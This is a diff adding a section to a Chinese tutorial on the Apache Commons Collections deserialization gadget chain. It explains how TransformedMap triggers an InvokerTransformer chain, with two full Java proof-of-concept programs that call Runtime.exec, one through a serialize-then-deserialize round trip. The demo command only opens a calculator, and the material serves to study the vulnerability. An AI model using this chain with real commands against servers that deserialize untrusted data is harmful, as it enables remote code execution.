@@ -254,7 +254,147 @@ new InvokerTransformer(
 
 所以我们需要解决以下问题：
 
-1. 传入恶意的的`ChainedTransformer`类
+1. 传入恶意的`ChainedTransformer`类
 2. 调用`ChainedTransformer`类创建的对象`chainedTransformer`的`transformer()`方法执行命令
 
-这里引入`TransformedMap`类，`org.apache.commons.collections.map.TransformedMap`类间接的实现了`java.util.Map`接口，同时支持对`Map`的`key`或者`value`进行`Transformer`转换
+这里引入`TransformedMap`类，`org.apache.commons.collections.map.TransformedMap`类间接的实现了`java.util.Map`接口，同时支持对`Map`的`key`或者`value`进行`Transformer`转换，通过调用`decorate()`和`decorateTransform()`方法都可以进入`TransformedMap()`构造函数
+![image-20220913165342046](images/image-20220913165342046.png)
+
+可以看到在`TransformedMap`类中通过`checkSetValue()`、`put()`和`putAll()`方法都可以调用传进来的`Transform`类（例如`InvokerTransformer`）的`transform()`方法
+![image-20220913173832979](images/image-20220913173832979.png)
+
+![image-20220913180215864](images/image-20220913180215864.png)
+
+POC 如下
+
+```java
+package com.serialize;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+import java.util.HashMap;
+import java.util.Map;
+
+/**
+ * Created by dotast on 2022/9/1 10:34
+ */
+public class TransformerTest {
+    public static void main(String[] args){
+        String cmd = "open -a Calculator.app";
+
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                // new Class[0]为占位符
+                new InvokerTransformer(
+                        "getMethod",new Class[]{String.class, Class[].class},new Object[]{"getRuntime",new Class[0]}
+                ),
+                new InvokerTransformer(
+                        "invoke",new Class[]{Object.class, Object[].class},new Object[]{null, new Object[0]}
+                ),
+                new InvokerTransformer(
+                        "exec", new Class[]{String.class}, new Object[]{cmd}
+                )
+        };
+        // 创建ChainedTransformer调用链
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+        // 创建Map对象
+        Map<Object, Object> map = new HashMap<>();
+        map.put("id", "name");
+        // 调用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象
+        Map transformedMap = TransformedMap.decorate(map, null, chainedTransformer);
+
+        // 遍历Map元素，并调用setValue方法
+        for(Object obj: transformedMap.entrySet()){
+            Map.Entry entry = (Map.Entry) obj;
+            entry.setValue("dotast");
+        }
+    }
+}
+```
+
+最后通过`setValue()`方法调用了`checkSetValue()`方法，从而造成命令执行
+![image-20220913180841818](images/image-20220913180841818.png)
+
+![image-20220913180501737](images/image-20220913180501737.png)
+
+模拟成现实情况（客户端发送请求-服务端处理请求）
+```java
+package com.serialize;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.util.HashMap;
+import java.util.Map;
+
+/**
+ * Created by dotast on 2022/9/1 10:34
+ */
+public class TransformerTest {
+    public static void main(String[] args) throws Exception {
+        TransformerTest transformerTest = new TransformerTest();
+        transformerTest.serialize();
+        transformerTest.unserialize();
+    }
+
+    /*
+    * 客户端
+    * */
+    public void  serialize() throws Exception{
+        String cmd = "open -a Calculator.app";
+
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                // new Class[0]为占位符
+                new InvokerTransformer(
+                        "getMethod",new Class[]{String.class, Class[].class},new Object[]{"getRuntime",new Class[0]}
+                ),
+                new InvokerTransformer(
+                        "invoke",new Class[]{Object.class, Object[].class},new Object[]{null, new Object[0]}
+                ),
+                new InvokerTransformer(
+                        "exec", new Class[]{String.class}, new Object[]{cmd}
+                )
+        };
+        // 创建ChainedTransformer调用链
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+        // 创建Map对象
+        Map<Object, Object> map = new HashMap<>();
+        // 调用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象
+        Map transformedMap = TransformedMap.decorate(map, null, chainedTransformer);
+        // 创建并实例化文件输出流
+        FileOutputStream fileOutputStream = new FileOutputStream("1.txt");
+        // 创建并实例化对象输出流
+        ObjectOutputStream out = new ObjectOutputStream(fileOutputStream);
+        out.writeObject(transformedMap);
+    }
+
+    /*
+    * 服务端
+    *  */
+    public void unserialize() throws Exception{
+        // 创建并实例化文件输入流
+        FileInputStream fileInputStream = new FileInputStream("1.txt");
+        // 创建并实例化对象输入流
+        ObjectInputStream in = new ObjectInputStream(fileInputStream);
+      	// 通过readObject方法进行反序列化
+        Map map = (Map) in.readObject();
+        map.put("id", "name");
+    }
+}
+```
+
+![image-20220913183349120](images/image-20220913183349120.png)
+
+相比之前触发反序列化的方式更为容易，当开发者将反序列化的对象转换成`Map`类型之后，通过`put()`、`putAll()`或者`setValue()`对`map`进行操作即可完成命令执行。
+
